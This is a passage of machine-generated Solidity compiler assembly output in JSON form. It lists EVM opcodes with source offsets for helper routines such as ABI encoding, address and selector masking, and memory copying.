											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 598,
											"end": 614,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 576,
											"end": 628,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 576,
											"end": 628,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 576,
											"end": 628,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 576,
											"end": 628,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 653,
											"end": 682,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 675,
											"end": 681,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 653,
											"end": 682,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 653,
											"end": 682,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 653,
											"end": 682,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 653,
											"end": 682,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 648,
											"end": 651,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 644,
											"end": 683,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 637,
											"end": 683,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 637,
											"end": 683,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 419,
											"end": 689,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 329,
											"end": 689,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 329,
											"end": 689,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 329,
											"end": 689,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 329,
											"end": 689,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 329,
											"end": 689,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 695,
											"end": 1068,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 695,
											"end": 1068,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 799,
											"end": 802,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 827,
											"end": 865,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 859,
											"end": 864,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 827,
											"end": 865,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 827,
											"end": 865,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 827,
											"end": 865,
											"name": "tag",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 827,
											"end": 865,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 881,
											"end": 969,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 962,
											"end": 968,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 957,
											"end": 960,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 881,
											"end": 969,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 881,
											"end": 969,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 881,
											"end": 969,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 881,
											"end": 969,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 874,
											"end": 969,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 874,
											"end": 969,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 978,
											"end": 1030,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 1023,
											"end": 1029,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1018,
											"end": 1021,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1011,
											"end": 1015,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1004,
											"end": 1009,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 1000,
											"end": 1016,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 978,
											"end": 1030,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 978,
											"end": 1030,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 978,
											"end": 1030,
											"name": "tag",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 978,
											"end": 1030,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1055,
											"end": 1061,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1050,
											"end": 1053,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1046,
											"end": 1062,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1039,
											"end": 1062,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1039,
											"end": 1062,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 803,
											"end": 1068,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 695,
											"end": 1068,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 695,
											"end": 1068,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 695,
											"end": 1068,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 695,
											"end": 1068,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 695,
											"end": 1068,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1074,
											"end": 1466,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 1074,
											"end": 1466,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1212,
											"end": 1215,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1227,
											"end": 1300,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1296,
											"end": 1299,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1287,
											"end": 1293,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1227,
											"end": 1300,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 1227,
											"end": 1300,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1227,
											"end": 1300,
											"name": "tag",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1227,
											"end": 1300,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1325,
											"end": 1326,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1320,
											"end": 1323,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1316,
											"end": 1327,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1309,
											"end": 1327,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1309,
											"end": 1327,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1337,
											"end": 1412,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 1408,
											"end": 1411,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1399,
											"end": 1405,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1337,
											"end": 1412,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 1337,
											"end": 1412,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1337,
											"end": 1412,
											"name": "tag",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 1337,
											"end": 1412,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1437,
											"end": 1439,
											"name": "PUSH",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 1432,
											"end": 1435,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1428,
											"end": 1440,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1421,
											"end": 1440,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1421,
											"end": 1440,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1457,
											"end": 1460,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1450,
											"end": 1460,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1450,
											"end": 1460,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1074,
											"end": 1466,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 1074,
											"end": 1466,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1074,
											"end": 1466,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1074,
											"end": 1466,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1074,
											"end": 1466,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1074,
											"end": 1466,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1472,
											"end": 1743,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 1472,
											"end": 1743,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1602,
											"end": 1605,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1624,
											"end": 1717,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 1713,
											"end": 1716,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1704,
											"end": 1710,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1624,
											"end": 1717,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1624,
											"end": 1717,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1624,
											"end": 1717,
											"name": "tag",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 1624,
											"end": 1717,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1617,
											"end": 1717,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1617,
											"end": 1717,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1734,
											"end": 1737,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1727,
											"end": 1737,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1727,
											"end": 1737,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1472,
											"end": 1743,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1472,
											"end": 1743,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1472,
											"end": 1743,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1472,
											"end": 1743,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1472,
											"end": 1743,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1749,
											"end": 2058,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 1749,
											"end": 2058,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1860,
											"end": 1864,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1898,
											"end": 1900,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1887,
											"end": 1896,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1883,
											"end": 1901,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1875,
											"end": 1901,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1875,
											"end": 1901,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1947,
											"end": 1956,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1941,
											"end": 1945,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1937,
											"end": 1957,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1933,
											"end": 1934,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1922,
											"end": 1931,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1918,
											"end": 1935,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1911,
											"end": 1958,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1975,
											"end": 2051,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 2046,
											"end": 2050,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2037,
											"end": 2043,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1975,
											"end": 2051,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 1975,
											"end": 2051,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1975,
											"end": 2051,
											"name": "tag",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1975,
											"end": 2051,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1967,
											"end": 2051,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1967,
											"end": 2051,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1749,
											"end": 2058,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1749,
											"end": 2058,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1749,
											"end": 2058,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1749,
											"end": 2058,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1749,
											"end": 2058,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2064,
											"end": 2162,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 2064,
											"end": 2162,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2115,
											"end": 2121,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2149,
											"end": 2154,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2143,
											"end": 2155,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 2133,
											"end": 2155,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2133,
											"end": 2155,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2064,
											"end": 2162,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2064,
											"end": 2162,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2064,
											"end": 2162,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2064,
											"end": 2162,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2168,
											"end": 2336,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 2168,
											"end": 2336,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2251,
											"end": 2262,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2285,
											"end": 2291,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2280,
											"end": 2283,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2273,
											"end": 2292,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2325,
											"end": 2329,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2320,
											"end": 2323,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2316,
											"end": 2330,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2301,
											"end": 2330,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2301,
											"end": 2330,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2168,
											"end": 2336,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2168,
											"end": 2336,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2168,
											"end": 2336,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2168,
											"end": 2336,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2168,
											"end": 2336,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2342,
											"end": 2489,
											"name": "tag",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 2342,
											"end": 2489,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2443,
											"end": 2454,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2480,
											"end": 2483,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2465,
											"end": 2483,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2465,
											"end": 2483,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2342,
											"end": 2489,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2342,
											"end": 2489,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2342,
											"end": 2489,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2342,
											"end": 2489,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2342,
											"end": 2489,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2495,
											"end": 2591,
											"name": "tag",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 2495,
											"end": 2591,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2532,
											"end": 2539,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2561,
											"end": 2585,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 2579,
											"end": 2584,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2561,
											"end": 2585,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "59"
										},
										{
											"begin": 2561,
											"end": 2585,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2561,
											"end": 2585,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 2561,
											"end": 2585,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2550,
											"end": 2585,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2550,
											"end": 2585,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2495,
											"end": 2591,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2495,
											"end": 2591,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2495,
											"end": 2591,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2495,
											"end": 2591,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2597,
											"end": 2746,
											"name": "tag",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 2597,
											"end": 2746,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2633,
											"end": 2640,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2673,
											"end": 2739,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF00000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2666,
											"end": 2671,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2662,
											"end": 2740,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 2651,
											"end": 2740,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2651,
											"end": 2740,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2597,
											"end": 2746,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2597,
											"end": 2746,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2597,
											"end": 2746,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2597,
											"end": 2746,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2752,
											"end": 2878,
											"name": "tag",
											"source": 1,
											"value": "59"
										},
										{
											"begin": 2752,
											"end": 2878,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2789,
											"end": 2796,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2829,
											"end": 2871,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2822,
											"end": 2827,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2818,
											"end": 2872,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 2807,
											"end": 2872,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2807,
											"end": 2872,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2752,
											"end": 2878,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2752,
											"end": 2878,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2752,
											"end": 2878,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2752,
											"end": 2878,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2884,
											"end": 3191,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 2884,
											"end": 3191,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2952,
											"end": 2953,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2962,
											"end": 3075,
											"name": "tag",
											"source": 1,
											"value": "63"
										},
										{
											"begin": 2962,
											"end": 3075,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2976,
											"end": 2982,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2973,
											"end": 2974,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2970,
											"end": 2983,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 2962,
											"end": 3075,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 2962,
											"end": 3075,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "65"
										},
										{
											"begin": 2962,
											"end": 3075,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3061,
											"end": 3062,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3056,
											"end": 3059,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3052,
											"end": 3063,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3046,
											"end": 3064,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3042,
											"end": 3043,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3037,
											"end": 3040,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3044,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3026,
											"end": 3065,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2998,
											"end": 3000,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2995,
											"end": 2996,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2991,
											"end": 3001,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2986,
											"end": 3001,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2986,
											"end": 3001,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2962,
											"end": 3075,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "63"
										},
										{
											"begin": 2962,
											"end": 3075,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 2962,
											"end": 3075,
											"name": "tag",
											"source": 1,
											"value": "65"
										},
										{
											"begin": 2962,
											"end": 3075,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3093,
											"end": 3099,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3090,
											"end": 3091,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3087,
											"end": 3100,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 3084,
											"end": 3185,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3084,
											"end": 3185,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 3084,
											"end": 3185,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3173,
											"end": 3174,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3164,
											"end": 3170,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 3159,
											"end": 3162,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 3155,
											"end": 3171,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3148,
											"end": 3175,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3084,
											"end": 3185,
											"name": "tag",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 3084,
											"end": 3185,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2933,
											"end": 3191,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2884,
											"end": 3191,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2884,
											"end": 3191,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2884,
											"end": 3191,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2884,
											"end": 3191,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3197,
											"end": 3297,
											"name": "tag",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 3197,
											"end": 3297,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3236,
											"end": 3243,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3265,
											"end": 3291,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 3285,
											"end": 3290,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3265,
											"end": 3291,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "69"
										},
										{
											"begin": 3265,
											"end": 3291,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3265,
											"end": 3291,
											"name": "tag",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 3265,
											"end": 3291,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3254,
											"end": 3291,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3254,
											"end": 3291,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3197,
											"end": 3297,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3197,
											"end": 3297,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3197,
											"end": 3297,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3197,
											"end": 3297,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3303,
											"end": 3381,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 3303,
											"end": 3381,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3341,
											"end": 3348,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3370,
											"end": 3375,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3359,
											"end": 3375,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3359,
											"end": 3375,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3303,
											"end": 3381,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3303,
											"end": 3381,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3303,
											"end": 3381,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3303,
											"end": 3381,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3387,
											"end": 3481,
											"name": "tag",
											"source": 1,
											"value": "69"
										},
										{
											"begin": 3387,
											"end": 3481,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3426,
											"end": 3433,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3455,
											"end": 3475,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "72"
										},
										{
											"begin": 3469,
											"end": 3474,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3455,
											"end": 3475,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "73"
										},
										{
											"begin": 3455,
											"end": 3475,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3455,
											"end": 3475,
											"name": "tag",
											"source": 1,
											"value": "72"
										},
										{
											"begin": 3455,
											"end": 3475,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3444,
											"end": 3475,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3444,
											"end": 3475,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3387,
											"end": 3481,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3387,
											"end": 3481,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3387,
											"end": 3481,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3387,
											"end": 3481,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3487,
											"end": 3589,
											"name": "tag",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3487,
											"end": 3589,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3528,
											"end": 3534,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3579,
											"end": 3581,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 3575,
											"end": 3582,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 3570,
											"end": 3572,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 3563,
											"end": 3568,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3559,
											"end": 3573,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3555,
											"end": 3583,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 3545,
											"end": 3583,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3545,
											"end": 3583,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3487,
											"end": 3589,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3487,
											"end": 3589,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3487,
											"end": 3589,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3487,
											"end": 3589,
											"name": "JUMP",
